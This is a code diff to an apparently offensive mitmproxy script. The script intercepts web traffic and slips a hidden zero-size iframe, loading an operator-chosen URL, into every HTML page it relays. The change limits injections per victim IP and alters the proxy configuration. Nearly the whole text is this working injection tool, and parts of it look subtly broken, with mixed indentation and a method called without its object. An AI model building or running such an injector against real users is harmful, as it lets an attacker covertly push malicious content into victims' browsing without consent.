@@ -3,6 +3,7 @@ from libmproxy import controller, proxy, platform
 import os
 import sys
 hostList = []
+maxConn = 2
 
 class InjectingMaster(controller.Master):
     def __init__(self, server, iframe_url):
@@ -20,15 +21,26 @@ class InjectingMaster(controller.Master):
             msg.headers["Accept-Encoding"][0] = 'none'
         msg.reply()
 
+    def checkHostinList(self,ip):
+	count=0
+	for host in hostList:
+		if host==ip:
+			count+=1
+	return count
+
     def handle_response(self, msg):
         if msg.content:
-            c = msg.replace('<body>', '<body><iframe src="%s" frameborder="0" height="0" width="0"></iframe>' % self._iframe_url)
-            if c > 0:
-		hostIP = str(msg.request.client_conn).split(':')[0]	
-		#if hostIP not in hostList:
-		#hostList.append(hostIP)
-	        print 'Iframe injected! :'+hostIP
-        msg.reply()
+	    hostIP = str(msg.request.client_conn).split(':')[0]	
+	    result = checkHostinList(self,hostIP)
+            if result<=maxConn:
+		print "Total connections from "+str(hostIP)+": "+str(result)
+		hostList.append(hostIP)
+    
+                c = msg.replace('<body>', '<body><iframe src="%s" frameborder="0" height="0" width="0"></iframe>' % self._iframe_url)
+                if c > 0:
+			hostIP = str(msg.request.client_conn).split(':')[0]	
+	        	print 'Iframe injected! :'+hostIP
+            msg.reply()
 
 
 def main(argv):
@@ -37,8 +49,9 @@ def main(argv):
         sys.exit(1)
     iframe_url = argv[1]
     config = proxy.ProxyConfig(
-        cacert = os.path.expanduser("~/.mitmproxy/mitmproxy-ca.pem"),
-	transparent_proxy = dict (resolver = platform.resolver(), sslports = [443, 8080])
+        cacert = os.path.expanduser("~/.mitmproxy/mitmproxy-ca.pem")
+	#,
+	#transparent_proxy = dict (resolver = platform.resolver(), sslports = [443, 8080])
     )
     server = proxy.ProxyServer(config, 8080)
     print 'Starting proxy...'
